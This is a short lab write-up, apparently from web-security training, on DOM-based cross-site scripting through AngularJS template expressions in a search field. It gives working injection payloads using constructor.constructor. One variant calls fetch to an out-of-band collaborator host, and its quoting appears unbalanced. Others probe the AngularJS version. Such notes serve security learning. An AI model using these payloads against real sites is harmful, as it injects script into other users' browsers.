@@ -1,0 +1,26 @@
+LAB INFO: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+
+MORE INFO OF THIS LAB:  This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.
+
+AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.
+
+To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function. 
+
+
+SOME KEY POINT HERE:    
+1. AngularJS contains the ng-app attribute(also called the AngularJS directive).
+2. When the directive is added to html code we can execute JavaScript code with the double curly braces.
+3. When we keep analyzing the source code or js code we will find this payload there: 
+   3.1 {{$on.constructor('alert(1)')()}} ==> We will found this payload in the one of the source code 
+   3.2 Thus this payload triggers an alert popup to me.
+
+4. Now, some methodology of mine here:
+   4.1 If we see AngularJS is being used and there is search field then try: 
+       4.1.1 {{}} this first and see how it shows
+       4.1.2 And after that always try for: {{constructor.constructor('alert(1)')()}}
+       4.1.3 If the CSP could not give alert then try: {{constructor.constructor('fetch("https://your.burpcollaborator.net")()}}
+5. Also know about the AngularJS version i.e 
+   5.1 angular.version.full
+   5.2 {{constructor.constructor('return angular.version.full')()}}
+
+HAPPY HACKING, I WILL BE THE GREAT HACKER I WILL MAKE MY FAMILY PROUD.
